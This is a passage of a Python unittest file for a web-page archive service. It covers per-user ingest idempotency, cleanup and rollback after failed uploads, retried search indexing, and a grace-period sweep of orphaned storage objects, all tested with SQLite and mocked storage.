            Bucket="b", Key="u1/p1/index.html",
        )


# ---------------------------------------------------------------------------
# Per-user ingest idempotency (2.6) — real SQLite DB
# ---------------------------------------------------------------------------

class TestPerUserIdempotency(unittest.TestCase):
    def setUp(self):
        from sqlalchemy import create_engine as ce
        self.engine = ce("sqlite://")
        Base.metadata.create_all(self.engine)
        self.engine_patcher = patch("servicer.get_engine", return_value=self.engine)
        self.engine_patcher.start()
        self.r2_patcher = patch("servicer.R2Client")
        self.mock_r2_cls = self.r2_patcher.start()
        self.mock_r2_cls.return_value = MagicMock()
        self.search_patcher = patch("servicer._get_search_stub", return_value=None)
        self.search_patcher.start()

    def tearDown(self):
        self.search_patcher.stop()
        self.r2_patcher.stop()
        self.engine_patcher.stop()

    def _ingest(self, user_id, job_id):
        from servicer import ArchiveServicer
        svc = ArchiveServicer()
        return svc.IngestPage(
            _build_ingest_request(user_id=user_id, extension_job_id=job_id),
            _FakeContext(),
        )

    def test_same_user_replay_returns_existing_page(self):
        r1 = self._ingest("uA", "job-1")
        r2 = self._ingest("uA", "job-1")
        self.assertEqual(r1.page_id, r2.page_id)
        # Only one set of uploads (1 asset + html + meta happens once;
        # here assets are empty so 2 uploads for the first ingest, 0 for replay)
        self.assertEqual(self.mock_r2_cls.return_value.upload.call_count, 2)

    def test_same_job_id_across_users_creates_distinct_pages(self):
        r_a = self._ingest("uA", "job-shared")
        r_b = self._ingest("uB", "job-shared")
        self.assertNotEqual(r_a.page_id, r_b.page_id)
        self.assertTrue(r_b.success)

        from models import Page
        from sqlalchemy import select

        with db_session(self.engine) as session:
            rows = session.execute(
                select(Page).where(Page.extension_job_id == "job-shared")
            ).scalars().all()
            self.assertEqual(len(rows), 2)
            self.assertEqual({r.user_id for r in rows}, {"uA", "uB"})
            page_a = session.execute(
                select(Page).where(Page.id == r_a.page_id)
            ).scalar_one()
            self.assertEqual(page_a.user_id, "uA")

    def test_composite_unique_enforced_in_schema(self):
        """The (user_id, extension_job_id) pair is unique, not the job id alone."""
        from models import Page
        from sqlalchemy import create_engine as ce
        from sqlalchemy.exc import IntegrityError

        eng = ce("sqlite://")
        Base.metadata.create_all(eng)
        with db_session(eng) as session:
            session.add(Page(id="x1", user_id="uA", url="http://a", title="t",
                             r2_key="k", extension_job_id="j"))
        with db_session(eng) as session:
            # Same job id, different user → allowed
            session.add(Page(id="x2", user_id="uB", url="http://b", title="t",
                             r2_key="k", extension_job_id="j"))
        with self.assertRaises(IntegrityError), db_session(eng) as session:
            session.add(Page(id="x3", user_id="uA", url="http://c", title="t",
                             r2_key="k", extension_job_id="j"))


# ---------------------------------------------------------------------------
# Failed-ingest R2 cleanup + quota rollback (2.9)
# ---------------------------------------------------------------------------

class TestFailedIngestCleanup(unittest.TestCase):
    @patch("servicer._get_search_stub", return_value=None)
    @patch("servicer.R2Client")
    @patch("servicer.check_and_reserve", return_value=None)
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_upload_failure_cleans_prefix_and_rolls_back(
        self, mock_engine, mock_db_session, mock_quota, mock_r2_cls, mock_search
    ):
        from servicer import ArchiveServicer

        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = None
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        r2 = MagicMock()
        # First asset upload succeeds, second fails
        r2.upload.side_effect = [None, RuntimeError("R2 exploded")]
        mock_r2_cls.return_value = r2

        svc = ArchiveServicer()
        ctx = _FakeContext()
        req = _build_ingest_request(assets=[
            archive_pb2.Asset(filename="a.jpg", content_type="image/jpeg", data=b"1"),
            archive_pb2.Asset(filename="b.jpg", content_type="image/jpeg", data=b"2"),
        ])

        with self.assertRaises(RuntimeError):
            svc.IngestPage(req, ctx)

        # The attempt's prefix was cleaned up best-effort
        prefix = r2.upload.call_args_list[0].args[0].rsplit("/assets/", 1)[0]
        r2.delete_prefix.assert_called_once_with(prefix)

        # Quota increments were rolled back with the session
        mock_session.rollback.assert_called()

    @patch("servicer._get_search_stub", return_value=None)
    @patch("servicer.R2Client")
    @patch("servicer.check_and_reserve", return_value=None)
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_cleanup_failure_logged_not_fatal(
        self, mock_engine, mock_db_session, mock_quota, mock_r2_cls, mock_search
    ):
        """Spec: cleanup failure is logged, not fatal — original error still raised."""
        from servicer import ArchiveServicer

        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = None
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        r2 = MagicMock()
        r2.upload.side_effect = RuntimeError("R2 down")
        r2.delete_prefix.side_effect = Exception("cleanup also failed")
        mock_r2_cls.return_value = r2

        svc = ArchiveServicer()
        ctx = _FakeContext()

        with self.assertRaises(RuntimeError):  # original error, not the cleanup error
            svc.IngestPage(_build_ingest_request(), ctx)


# ---------------------------------------------------------------------------
# Reliable search indexing (3.8) — real SQLite DB
# ---------------------------------------------------------------------------

class TestReliableSearchIndexing(unittest.TestCase):
    def setUp(self):
        from sqlalchemy import create_engine as ce
        self.engine = ce("sqlite://")
        Base.metadata.create_all(self.engine)
        self.engine_patcher = patch("servicer.get_engine", return_value=self.engine)
        self.engine_patcher.start()
        self.r2_patcher = patch("servicer.R2Client")
        self.r2_patcher.start()
        self.sleep_patcher = patch("servicer.time.sleep")
        self.sleep_patcher.start()

    def tearDown(self):
        self.sleep_patcher.stop()
        self.r2_patcher.stop()
        self.engine_patcher.stop()

    def _set_stub(self, stub):
        p = patch("servicer._get_search_stub", return_value=stub)
        p.start()
        self.addCleanup(p.stop)

    def _ingest(self):
        from servicer import ArchiveServicer
        return ArchiveServicer().IngestPage(_build_ingest_request(), _FakeContext())

    def _page_row(self, page_id):
        from models import Page
        from sqlalchemy import select
        from sqlalchemy.orm import sessionmaker

        session = sessionmaker(bind=self.engine)()
        try:
            # Read before close: db_session's commit would expire instances.
            return session.execute(
                select(Page).where(Page.id == page_id)
            ).scalar_one().search_indexed
        finally:
            session.close()

    def test_index_success_marks_page_indexed(self):
        stub = MagicMock()
        self._set_stub(stub)
        resp = self._ingest()
        self.assertEqual(stub.IndexPage.call_count, 1)
        self.assertTrue(self._page_row(resp.page_id))

    def test_retry_then_succeed_marks_indexed(self):
        """IndexPage fails twice, then succeeds → pending flag cleared."""
        stub = MagicMock()
        stub.IndexPage.side_effect = [
            grpc.RpcError("unavailable"),  # attempt 1 (has .code? plain RpcError ok)
            grpc.RpcError("unavailable"),  # attempt 2
            None,                          # attempt 3 succeeds
        ]
        self._set_stub(stub)
        resp = self._ingest()
        self.assertEqual(stub.IndexPage.call_count, 3)
        self.assertTrue(self._page_row(resp.page_id))

    def test_permanent_failure_leaves_pending_flag(self):
        """Failures beyond the retry budget stay pending, never swallowed."""
        stub = MagicMock()
        stub.IndexPage.side_effect = grpc.RpcError("down")
        self._set_stub(stub)
        resp = self._ingest()
        self.assertEqual(stub.IndexPage.call_count, 3)  # bounded retries
        self.assertFalse(self._page_row(resp.page_id))

    def test_no_search_service_leaves_pending_flag(self):
        self._set_stub(None)
        resp = self._ingest()
        self.assertFalse(self._page_row(resp.page_id))

    def test_retry_pending_indexing_retries_and_clears(self):
        """The maintenance RPC retries pending rows and clears them on success."""
        from servicer import ArchiveServicer

        self._set_stub(None)
        resp = self._ingest()  # indexed=False (no search service)
        self._set_stub(MagicMock())  # search service back up

        svc = ArchiveServicer()
        result = svc.RetryPendingIndexing(
            archive_pb2.RetryPendingIndexingRequest(limit=10), _FakeContext()
        )
        self.assertEqual(result.retried, 1)
        self.assertEqual(result.succeeded, 1)
        self.assertTrue(self._page_row(resp.page_id))

    def test_retry_pending_indexing_counts_failures(self):
        from servicer import ArchiveServicer

        self._set_stub(None)
        self._ingest()
        stub = MagicMock()
        stub.IndexPage.side_effect = grpc.RpcError("still down")
        self._set_stub(stub)

        result = ArchiveServicer().RetryPendingIndexing(
            archive_pb2.RetryPendingIndexingRequest(limit=10), _FakeContext()
        )
        self.assertEqual(result.retried, 1)
        self.assertEqual(result.succeeded, 0)


# ---------------------------------------------------------------------------
# Orphan sweep (5.9) — fake R2 + real SQLite DB
# ---------------------------------------------------------------------------

class _FakePaginator:
    def __init__(self, objects):
        self.objects = objects  # key -> LastModified datetime

    def paginate(self, Bucket=None, Prefix="", Delimiter=None, PaginationConfig=None):
        if Delimiter == "/":
            prefixes, contents = set(), []
            for key, mod in self.objects.items():
                if not key.startswith(Prefix):
                    continue
                rest = key[len(Prefix):]
                if "/" in rest:
                    prefixes.add(Prefix + rest.split("/", 1)[0] + "/")
                else:
                    contents.append({"Key": key, "LastModified": mod})
            yield {
                "CommonPrefixes": [{"Prefix": p} for p in sorted(prefixes)],
                "Contents": contents,
            }
        else:
            yield {
                "Contents": [
                    {"Key": k, "LastModified": self.objects[k]}
                    for k in sorted(self.objects)
                    if k.startswith(Prefix)
                ],
            }


class _FakeR2ForSweep:
    def __init__(self, objects):
        self.objects = dict(objects)
        self.bucket = "test-bucket"
        self.client = self
        self.deleted_keys = []

    def get_paginator(self, operation):
        return _FakePaginator(self.objects)

    def delete_objects(self, Bucket, Delete):
        for obj in Delete["Objects"]:
            self.deleted_keys.append(obj["Key"])
            self.objects.pop(obj["Key"], None)


class TestSweepOrphanR2Objects(unittest.TestCase):
    def setUp(self):
        from sqlalchemy import create_engine as ce
        self.engine = ce("sqlite://")
        Base.metadata.create_all(self.engine)
        self.engine_patcher = patch("servicer.get_engine", return_value=self.engine)
        self.engine_patcher.start()

        from datetime import timedelta
        now = datetime.now(timezone.utc).replace(tzinfo=None)
        self.old = now - timedelta(days=8)      # older than the 7d grace
        self.fresh = now - timedelta(hours=1)   # in-flight ingest territory

        # The sweep only considers UUID-shaped page ids (defensive: never
        # delete objects it cannot map to a page identity).
        self.live_pid = "11111111-1111-4111-8111-111111111111"
        self.old_pid = "22222222-2222-4222-8222-222222222222"
        self.fresh_pid = "33333333-3333-4333-8333-333333333333"

        # u-existing/<live_pid>: row exists → never swept
        # u-orphan/<old_pid>: no row, old → swept
        # u-orphan/<fresh_pid>: no row, fresh (in-flight) → left in place
        self.objects = {
            f"u-existing/{self.live_pid}/index.html": self.old,
            f"u-existing/{self.live_pid}/assets/a.png": self.old,
            f"u-orphan/{self.old_pid}/index.html": self.old,
            f"u-orphan/{self.old_pid}/assets/a.png": self.old,
            f"u-orphan/{self.old_pid}/meta.json": self.old,
            f"u-orphan/{self.fresh_pid}/index.html": self.fresh,
            f"u-orphan/{self.old_pid}.webp": self.old,
            "u-notauuid/whatever/index.html": self.old,  # not a page uuid → untouched
        }
        self.r2 = _FakeR2ForSweep(self.objects)
        r2_patcher = patch("servicer.R2Client", return_value=self.r2)
        r2_patcher.start()
        self.addCleanup(r2_patcher.stop)

        from models import Page, UserQuota
        with db_session(self.engine) as session:
            session.add(Page(id=self.live_pid, user_id="u-existing", url="http://x",
                             title="t", r2_key=f"u-existing/{self.live_pid}/index.html"))
            session.add(UserQuota(user_id="u-orphan", pages_this_month=3,
                                  total_bytes=12345,
                                  quota_reset_at=now + timedelta(days=20)))

    def tearDown(self):
        self.engine_patcher.stop()

    def _sweep(self, **kw):
        from servicer import ArchiveServicer
        return ArchiveServicer().SweepOrphanR2Objects(
            archive_pb2.SweepOrphanR2ObjectsRequest(**kw), _FakeContext()
        )

    def test_orphaned_old_prefix_swept_and_live_left(self):
        from models import UserQuota
        from sqlalchemy import select

        resp = self._sweep()  # defaults: 7d grace

        # Deleted: the old orphan prefix (3 objects) + its old thumbnail
        self.assertEqual(set(self.r2.deleted_keys), {
            f"u-orphan/{self.old_pid}.webp",
            f"u-orphan/{self.old_pid}/assets/a.png",
            f"u-orphan/{self.old_pid}/index.html",
            f"u-orphan/{self.old_pid}/meta.json",
        })
        self.assertEqual(resp.deleted_objects, 4)
        self.assertEqual(resp.deleted_prefixes, 1)
        self.assertGreaterEqual(resp.scanned_prefixes, 3)

        # Live page objects untouched
        self.assertIn(f"u-existing/{self.live_pid}/index.html", self.r2.objects)
        # Fresh orphan (in-flight ingest) untouched
        self.assertIn(f"u-orphan/{self.fresh_pid}/index.html", self.r2.objects)
        # Non-uuid folder untouched
        self.assertIn("u-notauuid/whatever/index.html", self.r2.objects)

        # Quota counters unchanged (quota-neutral)
        with db_session(self.engine) as session:
            quota = session.execute(
                select(UserQuota).where(UserQuota.user_id == "u-orphan")
            ).scalar_one()
            self.assertEqual(quota.total_bytes, 12345)
            self.assertEqual(quota.pages_this_month, 3)

    def test_short_grace_allows_fresh_deletion(self):
        self._sweep(grace_period_seconds=60)  # 1 minute grace
        # Fresh object is 1h old > 60s grace → now deletable
        self.assertNotIn(f"u-orphan/{self.fresh_pid}/index.html", self.r2.objects)

    def test_long_grace_protects_everything(self):
        resp = self._sweep(grace_period_seconds=365 * 24 * 3600)
        self.assertEqual(resp.deleted_objects, 0)
        self.assertEqual(self.r2.deleted_keys, [])


if __name__ == "__main__":
    unittest.main()
